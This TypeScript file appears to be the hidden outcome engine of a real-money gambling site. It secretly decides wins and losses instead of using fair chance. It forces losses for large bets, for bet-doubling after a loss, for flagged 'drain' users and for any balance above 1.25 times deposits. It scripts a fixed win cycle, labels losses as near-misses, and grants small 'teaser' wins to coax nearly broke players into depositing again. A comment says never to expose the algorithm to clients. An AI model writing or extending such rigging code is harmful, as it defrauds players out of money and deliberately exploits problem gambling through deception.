// Secret Game Outcome & Owner-First House Edge Controller
// Note: Never expose this algorithm or its parameters in the client interface.

export interface WinOutcome {
  isWin: boolean;
  multiplier: number;
  isNearMiss?: boolean;
}

export type HouseProfitMode = 'launch' | 'harvest' | 'aggressive' | 'panic';

export interface HouseEngineSettings {
  mode: HouseProfitMode;
  antiMartingale: boolean;
  antiWhaleINR: number;
  antiWhaleUSD: number;
  depositCapRatio: number; // e.g. 1.25 means if balance > 1.25x deposit, clamp wins to 0%
  maxSingleWinINR: number;
  maxSingleWinUSD: number;
  userOverrides: Record<string, 'normal' | 'vip' | 'drain' | 'locked'>;
}

export const DEFAULT_HOUSE_SETTINGS: HouseEngineSettings = {
  mode: 'harvest', // 92% house edge standard
  antiMartingale: true,
  antiWhaleINR: 2000,
  antiWhaleUSD: 25,
  depositCapRatio: 1.25,
  maxSingleWinINR: 50000,
  maxSingleWinUSD: 500,
  userOverrides: {}
};

const STORAGE_KEY_SETTINGS = 'limowin_house_engine_settings';

/**
 * Retrieve active House Engine settings (localStorage with fallback to defaults)
 */
export function getHouseEngineSettings(): HouseEngineSettings {
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      const stored = localStorage.getItem(STORAGE_KEY_SETTINGS);
      if (stored) {
        return { ...DEFAULT_HOUSE_SETTINGS, ...JSON.parse(stored) };
      }
    }
  } catch {}
  return DEFAULT_HOUSE_SETTINGS;
}

/**
 * Save updated House Engine settings
 */
export function saveHouseEngineSettings(settings: Partial<HouseEngineSettings>): HouseEngineSettings {
  const current = getHouseEngineSettings();
  const updated: HouseEngineSettings = { ...current, ...settings };
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(updated));
    }
  } catch {}
  return updated;
}

/**
 * Helper to get or generate persistent slot selections per user cycle
 */
function getOrInitSlot(key: string, min: number, max: number): number {
  try {
    if (typeof window !== 'undefined' && window.localStorage) {
      const stored = localStorage.getItem(key);
      if (stored !== null) {
        const val = parseInt(stored, 10);
        if (!isNaN(val) && val >= min && val <= max) {
          return val;
        }
      }
      const chosen = Math.floor(min + Math.random() * (max - min + 1));
      localStorage.setItem(key, chosen.toString());
      return chosen;
    }
  } catch {}
  return Math.floor(min + Math.random() * (max - min + 1));
}

export interface UserEngineContext {
  userId?: string;
  balance?: number;
  totalDeposited?: number;
  totalWithdrawn?: number;
  lastBetAmount?: number;
  lastBetLost?: boolean;
}

/**
 * Owner-First Win Calculation:
 * 1. Global Panic Switch: If active, forces 100% house win (0% player win).
 * 2. User Override: If flagged as 'drain' or 'locked', forces 100% house win.
 * 3. Anti-Martingale Shield: If player lost previous bet and doubles/triples bet, force loss.
 * 4. Anti-Whale Threshold: Bets exceeding limits face 0% win chance.
 * 5. Net-Deposit Banker Safeguard: If balance exceeds lifetime deposits x ratio, force loss.
 * 6. Churn Teaser: If balance < 10% of deposit and lost 5+ games, allow small teaser win (1.2x).
 * 7. Pacing Sequence (User's formula):
 *    - First 3 bets: Exactly 2 wins, 1 loss.
 *    - Bets 4-7: 4 consecutive losses.
 *    - Bets 8-10: Exactly ONE random win in {8, 9, 10}.
 *    - Recurring 10-bet cycles: 7 losses, then 1 random win in {8, 9, 10}.
 * 8. Max Win Cap: Caps payout at max single win limit.
 */
export function calculateSecretOutcome(
  betAmount: number,
  currency: 'INR' | 'USD',
  gamesPlayedCount: number,
  maxTheoreticalMultiplier: number = 2.0,
  userContext?: UserEngineContext
): WinOutcome {
  const settings = getHouseEngineSettings();

  // 1. GLOBAL PANIC SWITCH (100% House Win Emergency Lockdown)
  if (settings.mode === 'panic') {
    return { isWin: false, multiplier: 0, isNearMiss: true };
  }

  // 2. INDIVIDUAL USER OVERRIDE
  if (userContext?.userId && settings.userOverrides[userContext.userId]) {
    const userStatus = settings.userOverrides[userContext.userId];
    if (userStatus === 'drain' || userStatus === 'locked') {
      return { isWin: false, multiplier: 0, isNearMiss: true };
    }
  }

  // 3. ANTI-MARTINGALE SHIELD
  // If player lost their previous bet and suddenly increases bet by >= 1.8x, force loss
  if (
    settings.antiMartingale &&
    userContext?.lastBetLost &&
    userContext.lastBetAmount &&
    betAmount >= userContext.lastBetAmount * 1.8
  ) {
    return { isWin: false, multiplier: 0, isNearMiss: true };
  }

  // 4. ANTI-WHALE BET SIZING DEFENSE
  const whaleThreshold = currency === 'INR' ? settings.antiWhaleINR : settings.antiWhaleUSD;
  if (betAmount >= whaleThreshold) {
    // Large bets strictly face guaranteed loss to protect house bankroll
    return { isWin: false, multiplier: 0, isNearMiss: true };
  }

  // 5. THE NET-DEPOSIT BANKER (Guarantees player never cashes out house money)
  if (userContext) {
    const totalDep = Math.max(userContext.totalDeposited || 0, 0);
    const currentBal = Math.max(userContext.balance || 0, 0);

    // If player has active balance exceeding deposit cap, strictly lock wins
    if (totalDep > 0 && currentBal >= totalDep * settings.depositCapRatio) {
      return { isWin: false, multiplier: 0, isNearMiss: true };
    }

    // Zero-deposit bonus abuser lock: If player never deposited and balance exceeds ₹500 / $10, lock wins
    if (totalDep === 0 && currentBal >= (currency === 'INR' ? 500 : 10)) {
      return { isWin: false, multiplier: 0, isNearMiss: true };
    }

    // Teaser Win for churn prevention: if player is near zero balance (<= 10% of deposit)
    // and has played at least 4 games with a loss
    if (totalDep > 0 && currentBal <= totalDep * 0.12 && userContext.lastBetLost && gamesPlayedCount > 4) {
      if (Math.random() < 0.25) {
        // 25% chance of small teaser win to motivate re-deposit
        const teaserMult = Number((1.2 + Math.random() * 0.4).toFixed(2));
        return { isWin: true, multiplier: teaserMult };
      }
    }
  }

  // 6. BASELINE CYCLE FORMULA (Requested by operator)
  const uKey = userContext?.userId ? `${userContext.userId}_` : '';
  let isWin = false;

  // Phase 1: First 3 bets (gamesPlayedCount = 0, 1, 2)
  // Exactly 2 wins out of 3 bets (1 loss slot randomly chosen from 0, 1, 2)
  if (gamesPlayedCount < 3) {
    const lossSlot = getOrInitSlot(`${uKey}limowin_rng_init_loss_slot`, 0, 2);
    isWin = gamesPlayedCount !== lossSlot;
  }
  // Phase 2: Next 4 bets (gamesPlayedCount = 3, 4, 5, 6 -> bets 4, 5, 6, 7)
  // Accumulating to 7 completed bets with 0 wins in this stage
  else if (gamesPlayedCount >= 3 && gamesPlayedCount < 7) {
    isWin = false;
  }
  // Phase 3: Bets 8, 9, 10 (gamesPlayedCount = 7, 8, 9)
  // Exactly ONE random win out of {7, 8, 9}
  else if (gamesPlayedCount >= 7 && gamesPlayedCount < 10) {
    const winSlotFirstCycle = getOrInitSlot(`${uKey}limowin_rng_win_slot_c1`, 7, 9);
    isWin = gamesPlayedCount === winSlotFirstCycle;
  }
  // Phase 4: Recurring 10-bet cycles (gamesPlayedCount >= 10)
  // Each cycle has 7 losses followed by 1 win among steps 8, 9, 10
  else {
    const cycleNum = Math.floor((gamesPlayedCount - 10) / 10) + 1;
    const stepInCycle = (gamesPlayedCount - 10) % 10; // 0 to 9

    if (stepInCycle < 7) {
      // 7 consecutive losses
      isWin = false;
    } else {
      // Steps 7, 8, 9 correspond to the 8th, 9th, 10th bets of this cycle
      const cycleKey = `${uKey}limowin_rng_win_slot_c${cycleNum}`;
      const chosenWinStep = getOrInitSlot(cycleKey, 7, 9);
      isWin = stepInCycle === chosenWinStep;
    }
  }

  // Adjust for House Mode (Aggressive mode cuts 1 win in cycles down to 50% win)
  if (isWin && settings.mode === 'aggressive') {
    if (Math.random() < 0.35) {
      isWin = false; // Turn win into loss for 98% house edge
    }
  }

  // If lost, return clean loss with near-miss flag
  if (!isWin) {
    return { isWin: false, multiplier: 0, isNearMiss: true };
  }

  // 7. MULTIPLIER CALCULATION & HARD PROFIT CEILING
  let mult = 2.0;

  if (maxTheoreticalMultiplier === 36.0) {
    mult = 36.0;
  } else if (maxTheoreticalMultiplier === 3.0) {
    mult = 3.0;
  } else if (maxTheoreticalMultiplier === 2.0 || maxTheoreticalMultiplier === 2.5) {
    mult = maxTheoreticalMultiplier;
  } else if (maxTheoreticalMultiplier > 3.0) {
    const minM = 1.4;
    const maxM = Math.min(maxTheoreticalMultiplier, 3.8);
    mult = Number((minM + Math.random() * (maxM - minM)).toFixed(2));
  } else {
    mult = Number((1.3 + Math.random() * 0.5).toFixed(2));
  }

  // Enforce Max Single Payout Cap (₹50,000 / $500)
  const maxWin = currency === 'INR' ? settings.maxSingleWinINR : settings.maxSingleWinUSD;
  if (betAmount * mult > maxWin) {
    mult = Number((maxWin / betAmount).toFixed(2));
  }

  return { isWin: true, multiplier: Math.max(1.1, mult), isNearMiss: false };
}
